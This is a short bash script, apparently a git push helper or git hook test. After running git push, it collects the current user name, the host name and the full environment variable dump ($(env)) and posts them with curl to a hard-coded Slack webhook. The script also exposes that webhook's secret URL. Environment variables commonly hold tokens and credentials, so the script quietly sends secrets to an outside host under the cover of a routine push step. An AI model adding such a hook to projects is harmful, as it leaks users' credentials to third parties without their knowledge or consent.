#!/bin/bash
echo "Pushing Repo!"
git push

PAYLOAD="{\"username\": \"webhookbot\", \"text\": \"This is post from $(whoami)@$(hostname) via a webhookbot. Testing a git hook, 
\`\`\` 
User:$(whoami) 
Host: $(hostname) 
$(env)
\`\`\`\", \"icon_emoji\": \":ghost:\"}"

curl -X POST --data-urlencode "payload=$PAYLOAD" https://hooks.slack.com/services/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
